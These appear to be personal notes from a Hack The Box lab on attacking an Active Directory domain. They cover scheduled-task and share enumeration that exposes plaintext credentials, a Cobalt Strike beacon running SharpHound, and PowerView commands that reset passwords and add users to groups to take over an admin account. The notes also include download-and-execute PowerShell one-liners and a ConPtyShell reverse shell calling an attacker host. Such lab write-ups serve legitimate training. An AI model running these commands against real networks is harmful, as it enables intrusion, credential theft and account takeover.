in `htb` enterprise click `restore` to catch a `reverse shell` on `SQL01`
![[Pasted image 20231221113346.png]]
from `SQL-01` utilize the command `schtasks` to identify scheduled tasks that are running on the machine
```powershell
PS C:\Windows\system32> schtasks                                                                                                                        
Folder: \                                                                                                                                               
TaskName                                 Next Run Time          Status                                                                                  
======================================== ====================== ===============                                                                         
CreateExplorerShellUnelevatedTask        N/A                    Ready                                                                                   
Map Share at boot                        N/A                    Ready                                                                                   
Responder ldap service account           12/21/2023 11:39:59 AM Ready                                                                                   
```
one of the first `TaskName`'s shown is `"Map Share at boot"` utilize the `schtasks` query below to identify what is actually running 
```powershell
PS C:\Windows\system32> schtasks /query /tn "Map Share at boot"                                                                                         
Folder: \                                                                                                                                               
TaskName                                 Next Run Time          Status                                                                                  
======================================== ====================== ===============                                                                         
Map Share at boot                        N/A                    Ready                                                                                  
```
this command gives the `gritty` details of what te `schtasks` is doing
```powershell
PS C:\Windows\system32> SCHTASKS /Query /TN "Map Share at boot" /FO list /v                                                                                         
Folder: \                                                                                                                                               
HostName:                             SQL01                                                                                                             
TaskName:                             \Map Share at boot
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        12/18/2023 6:01:44 PM
Last Result:                          0
Author:                               CORP\iamtheadministrator
Task To Run:                          C:\Users\Public\Libraries\share.bat 
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
PS C:\Windows\system32> schtasks
```
navigate to `cd C:\Users\Public\Libraries\` and `cat` `share.bat`
```powershell
PS C:\Windows\system32> cd C:\Users\Public\Libraries\
PS C:\Windows\system32> dir

    Directory: C:\Users\Public\Libraries

Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----        8/27/2016  11:54 AM         138920 Autologon.exe                                    
-a----        7/16/2016   9:21 AM            999 RecordedTV.library-ms                            
-a----        4/26/2018  11:55 AM             89 share.bat                                        

PS C:\Windows\system32> cat share.bat
@echo off
net use Z: \\fs01\users\bill\documents /user:CORP\bill "I like to map Shares!"
PS C:\Windows\system32> 
```
shows a `sharedrive` to `map` to, utilize the `net use` command to map to the drive
- utilizing the `Z` share doesn't work
```powershell
PS C:\Windows\system32> net use X: \\fs01\users\bill\documents /user:CORP\bill "I like to map Shares!"                                                                                                     
The command completed successfully.      
```
utilizing base `net use` to ensure that the `sharedrive` was properly mapped
```powershell
PS C:\Windows\system32> net use                                                                                                                                                                            
New connections will be remembered.                                                                                                                     
Status       Local     Remote                    Network                                                                                                
-------------------------------------------------------------------------------                                                                         
OK           X:        \\fs01\users\bill\documents                                                                                                      
                                                Microsoft Windows Network                                                                                                                                  
The command completed successfully.                                                
```
`dir` the `drive`
```powershell
PS C:\Windows\system32> dir \\fs01\users\bill\documents\

    Directory: \\fs01\users\bill\documents

Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----        7/16/2018   4:30 PM            625 backup.ps1                                       
-a----        4/29/2018   3:18 AM             32 flag.txt                                         
```
`cat flag.txt`
```powershell
PS C:\Windows\system32> cat \\fs01\users\bill\documents\flag.txt
OFFSHORE{sl0ppy_scr1pting_hurt$}
``` 
`cat backup.ps1`
```powershell
PS C:\Windows\system32> cat \\fs01\users\bill\documents\backup.ps1
#set server location,credentials
$Server = "\\172.16.4.100"
$FullPath = "$Server\q1\backups"
$username = "pgibbons"
$password = "I l0ve going Fishing!"

net use $Server $password /USER:$username  
try  
{
#copy the backup
Copy-Item $zipFileName $FullPath  
#remove all zips older than 1 month from the unc path
Get-ChildItem "$uncFullPath\*.zip" |? {$_.lastwritetime -le (Get-Date).AddMonths(-1)} |% {Remove-Item $_ -force }  
}
catch [System.Exception] {  
WriteToLog -msg "could not copy backup to remote server... $_.Exception.Message" -type Error  
}
finally {  
#cleanup
net use $Server /delete  
}
PS C:\Windows\system32> 

```

use bloodhound with `WSADM` domain credentials to find how to connect to 172.16.4.100

# SQL01 session

from `sql-01` setup a `cobalt strike beacon`
![[Pasted image 20231221144958.png]]
running `sharphound.exe` as `domain user` bill, can be any `DU`
```powershell
beacon> execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --ldapusername bill --ldappassword "I like to map Shares!"
[*] Tasked beacon to run .NET program: SharpHound.exe -c all --ldapusername bill --ldappassword "I like to map Shares!"

[+] host called home, sent: 1155966 bytes
[+] received output:
2023-12-21T13:30:16.8241302-05:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound

2023-12-21T13:30:17.4022590-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

2023-12-21T13:30:17.4491315-05:00|INFORMATION|Initializing SharpHound at 1:30 PM on 12/21/2023


[+] received output:
2023-12-21T13:30:18.2460132-05:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for corp.local : DC01.corp.local


[+] received output:
2023-12-21T13:30:18.4022673-05:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote


[+] received output:
2023-12-21T13:30:18.6835137-05:00|INFORMATION|Beginning LDAP search for corp.local

2023-12-21T13:30:18.7928893-05:00|INFORMATION|Producer has finished, closing LDAP channel


[+] received output:
2023-12-21T13:30:18.8553895-05:00|INFORMATION|LDAP channel closed, waiting for consumers


beacon> pwd
[*] Tasked beacon to print working directory
[+] host called home, sent: 8 bytes
[*] Current directory is C:\Users\Hax0r
[+] received output:
2023-12-21T13:30:49.6680496-05:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM

[+] received output:
2023-12-21T13:31:04.8712567-05:00|INFORMATION|Consumers finished, closing output channel


[+] received output:
2023-12-21T13:31:04.9181330-05:00|INFORMATION|Output channel closed, waiting for output task to complete

Closing writers

2023-12-21T13:31:05.0743772-05:00|INFORMATION|Status: 356 objects finished (+356 7.73913)/s -- Using 41 MB RAM

2023-12-21T13:31:05.0899994-05:00|INFORMATION|Enumeration finished in 00:00:46.4047932


[+] received output:
2023-12-21T13:31:05.2150018-05:00|INFORMATION|Saving cache with stats: 315 ID to type mappings.
 322 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.

2023-12-21T13:31:05.2306261-05:00|INFORMATION|SharpHound Enumeration Completed at 1:31 PM on 12/21/2023! Happy Graphing!
```
checking to ensure that the `bloodhound.zip` file was made
```powershell
[12/21 13:31:05] beacon> ls
[12/21 13:31:05] [*] Tasked beacon to list files in .
[12/21 13:31:05] [+] host called home, sent: 19 bytes
[12/21 13:31:05] [*] Colors scheme:
[*] ---------------------------
[*] Directories:  YELLOW 
[*] Cobalt Strike Uploaded Files: BLUE
[*] Sensitive files:  RED 
[*] Configuration files:  DARK GREEN 
[*] Archives:  ORANGE 
[*] Source codes:  DARK BLUE 
[*] Executables:  MAGENTA 
[*] Documents:  GREEN 
[+] Location: C:\Users\Hax0r\*

 Size       Type    Last Modified         Name
 ----       ----    -------------------   ----
            dir     12/15/2023 06:59:58   AppData 
            dir     12/15/2023 06:59:58   Application Data 
            dir     12/15/2023 07:00:00   Contacts 
            dir     12/15/2023 06:59:58   Cookies 
            dir     12/15/2023 07:00:00   Desktop 
            dir     12/15/2023 07:57:42   Documents 
            dir     12/15/2023 07:00:00   Downloads 
            dir     12/15/2023 07:00:00   Favorites 
            dir     12/15/2023 07:00:00   Links 
            dir     12/15/2023 06:59:58   Local Settings 
            dir     12/15/2023 07:00:00   Music 
            dir     12/15/2023 06:59:58   My Documents 
            dir     12/15/2023 06:59:58   NetHood 
            dir     12/15/2023 07:00:00   Pictures 
            dir     12/15/2023 06:59:58   PrintHood 
            dir     12/15/2023 06:59:58   Recent 
            dir     12/15/2023 07:00:00   Saved Games 
            dir     12/15/2023 07:00:10   Searches 
            dir     12/15/2023 06:59:58   SendTo 
            dir     12/15/2023 06:59:58   Start Menu 
            dir     12/15/2023 06:59:58   Templates 
            dir     12/15/2023 07:00:00   Videos 
 28KB       fil     12/21/2023 13:31:05   20231221133103_BloodHound.zip 
 49KB       fil     12/21/2023 13:31:05   M2Q0ZGRlNjQtMTUwOS00MWEzLWJiMzQtNzlkNmNmM2Q4NGY1.bin 
 3MB        fil     12/18/2023 18:01:27   NTUSER.DAT 
 408KB      fil     12/15/2023 06:59:58   ntuser.dat.LOG1 
 803KB      fil     12/15/2023 06:59:58   ntuser.dat.LOG2 
 64KB       fil     12/18/2023 17:30:09   NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TM.blf 
 512KB      fil     12/18/2023 17:30:09   NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000001.regtrans-ms 
 512KB      fil     12/18/2023 17:30:09   NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000002.regtrans-ms 
 20B        fil     12/15/2023 06:59:58   ntuser.ini 
```
`downloaded` file and `sync'd`
```powershell
beacon> download 20231221133103_BloodHound.zip
[*] Tasked beacon to download 20231221133103_BloodHound.zip
[+] host called home, sent: 37 bytes
[*] started download of C:\Users\Hax0r\20231221133103_BloodHound.zip (28648 bytes)
[*] download of 20231221133103_BloodHound.zip is complete
```
`drag` & `dropped` Bloodhound.zip into bloodhound client 
now looking into new user `pgibbons` found to see what the user is able to do.
![[Pasted image 20231221152511.png]]172.16.1.26 ?

salvador@corp.local?
PGIBBONS has access to SALVADOR@CORP.LOCAL
![[Pasted image 20231221154252.png]]
Salvador@CORP.local has access to the Security Engineers@corp.local
![[Pasted image 20231228092903.png]]




IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8080/PowerView.ps1'))

if we get access to the `Security Engineers` Group we are able to get access of CYBER_ADM@CORP.LOCAL
searched `SECURITY ENGINEERS` & `FIRST DEGREE OBJECT CONTROL`
![[Pasted image 20231228162353.png]]


# to get into CYBER_ADM (bloodhound)

utilizing the pgibbons credentials found to change salvador's password
BloodHound AllExtendedRights abuse
```powershell
$username = 'corp\pgibbons'    # assigning credentials to username and password variable
$password = 'I l0ve going Fishing!'

$securePassword = ConvertTo-SecureString $password -AsPlaintText -Force # converting pgibbons password to a Secure String
$credential =  New-Object System.Management.Automation.PSCredential $username, $securePassword # assigning the corp\pgibbons username and password to credential variable

IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8080/PowerView.ps1')) # pulled over PowerView.ps1

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force # making Password123! a secure string and assigning to $UserPassword variable
Set-DomainUserPassword -Identity "salvador" -AccountPassword $UserPassword -credential $credential # utilizing PowerView.ps1 to change Salvador's password to Password123! with the corp\pgibbons credentials
```
changing the credentials of salvador and adding to security engineers group
```powershell
$username = 'corp\salvador'    # assigning credentials to username and password variable
$password = 'Password123!'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force # coverting the Password123! to a secure string
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword # assigning the corp\salvador username and securepassword to $credential
Add-DomainGroupMember -Identity "security engineers" -Members "salvador" -credential $credential # adding salvador user to the security engineers group utilizing the new salvador credentials
```
now change the cyber_adm password
```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force # Assigning Password123! as a secure string to $UserPassword
Set-DomainUserPassword -Identity cyber_adm -AccountPassword $UserPassword -credential $credential # setting cyber_adm account password to Password123! 
```

![[Pasted image 20231228185333.png]]



hey mr. grosabi so I need help with getting onto Web-WIN01. Really just want you to proof read what i've been doing because now im giga stuck. So I found that pgibbons has first degree object control of salvador@corp.local

& salvador has access to the Security Engineers

and the Security Engineers group has AllExtendedRights so salvador should be able to change the credentials of Cyber_Adm. 

Pretty much my psexec aint working and ive spent all day trying to rerun/fix this shit. I just wanna know if the environment is just screwed up or what because this should work... And if theres a way to see if the credentials were actually applied? I couldnt find anything about it online.



```powershell
powershell "IEX(IWR http://10.10.14.39:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.39 3001"
```

`iex (iwr 'http://10.10.14.39:8080/powerview.ps1' -useb)`



```powershell
PS C:\Windows\Tasks> 

$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp.local\pgibbons', $SecPassword)
$UserPassword = ConvertTo-SecureString 'gr0s4b1_w4s_h3r3!' -AsPlainText -Force;
Set-DomainUserPassword -Identity salvador -AccountPassword $UserPassword -Credential $Cred
$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential('corp.local\pgibbons', $SecPassword);
$UserPassword = ConvertTo-SecureString 'gr0s4b1_w4s_h3r3!' -AsPlainText -Force;
Set-DomainUserPassword -Identity salvador -AccountPassword $UserPassword -Credential $Cred
```
setting user as salvador
```powershell
$username = 'corp\salvador'
$password = 'gr0s4b1_w4s_h3r3!'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Set-DomainUserPassword -Identity cyber_adm -AccountPassword $securePassword -credential $credential
```